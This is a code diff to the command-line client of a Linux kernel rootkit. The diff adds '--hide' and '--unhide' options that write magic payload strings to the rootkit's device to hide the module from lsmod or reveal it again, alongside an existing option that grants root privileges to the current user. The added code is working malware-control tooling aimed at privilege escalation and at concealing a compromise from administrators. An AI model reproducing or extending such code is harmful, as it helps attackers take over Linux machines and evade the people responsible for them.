@@ -15,12 +15,16 @@ void display_help(char * filename);
 int check_driver(char *driver);
 int privesc(char *driver);
 void show_info();
+int hide(char *driver);
+int unhide(char *driver);
 
 char *valid_args[] =
     {
         "-h", "--help", 
         "-p", "--privesc",
-        "--info"
+        "--info",
+        "--unhide",
+        "--hide"
     };
 
 void show_info(){
@@ -28,6 +32,8 @@ void show_info(){
     printf("misc device name=%s \n", RK_DRIVER);
     printf("path=/dev/%s \n", RK_DRIVER);
     printf("privesc payload=\"%s\" \n", RK_PRIVESC);
+    printf("hide payload=\"%s\" \n", RK_HIDE);
+    printf("unhide payload=\"%s\" \n", RK_REVEAL);
 
 }
 void display_help(char * filename){
@@ -37,8 +43,10 @@ void display_help(char * filename){
     printf("\n");
     printf("Operations: \n");
     printf("    -h --help       Display this menu\n");
-    printf("    -p --privesc    Give root privileges to current user\n");
+    printf("    -p --privesc    Give root privileges to the current user\n");
     printf("    --info          Display infos about the rootkit\n");
+    printf("    --hide          Hide the rootkit from modules list\n");
+    printf("    --unhide        Unhide the rootkit from module list (then allow us to remove the rootkit)\n");
 
     exit(-1);
 }
@@ -65,15 +73,55 @@ int privesc(char *driver){
 
     ret = write(fd, payload, strlen(payload));
 
-    if (ret == -1){
+    if (ret < 0){
         CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
         return -1;
     } else{
-        CLIENT_DEBUG("Wrote : '%s' for a length of %d bytes\n", payload, strlen(payload));
+        CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
     }
 
     return 0;
 }
+
+int hide(char *driver){
+
+    int ret;
+    int fd = open(driver, O_WRONLY);
+    const char * payload = RK_HIDE;
+
+    ret = write(fd, payload, strlen(payload));
+
+    if (ret < 0){
+        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
+        return -1;
+    } else{
+        CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
+        CLIENT_DEBUG("Rootkit shouldd be hidden from lsmod ! \n");
+    }
+
+    return 0;
+}
+
+int unhide(char *driver){
+
+    int ret;
+    int fd = open(driver, O_WRONLY);
+    const char * payload = RK_REVEAL;
+
+    ret = write(fd, payload, strlen(payload));
+
+    if (ret < 0){
+        CLIENT_DEBUG("Failed to write to device %s value : %s\n", driver, payload);
+        return -1;
+    } else{
+        CLIENT_DEBUG("Wrote : '%s' for a length of %ld bytes\n", payload, strlen(payload));
+        CLIENT_DEBUG("Rootkit sholud be present in lsmod ! \n");
+    }
+
+    return 0;
+}
+
+
 
 int main(int argc, char *argv[]) {     
 
@@ -88,7 +136,7 @@ int main(int argc, char *argv[]) {
 
     if (check_driver(driver) == -1)
     {
-        CLIENT_DEBUG("Rootkit not loaded\n");
+        printf("Rootkit not loaded\n");
         exit(-1);
     }
 
@@ -105,6 +153,19 @@ int main(int argc, char *argv[]) {
         else if ((strcmp(argv[i], "--info") == 0) && (i == 1))
         {
             show_info();
+            exit(-1);   
+        }
+
+        else if (strcmp(argv[i], "--unhide") == 0)
+        {
+            unhide(driver);
+            exit(-1);   
+        }
+
+        else if (strcmp(argv[i], "--hide") == 0)
+        {
+
+            hide(driver);
             exit(-1);   
         }
         else if (i > 0)
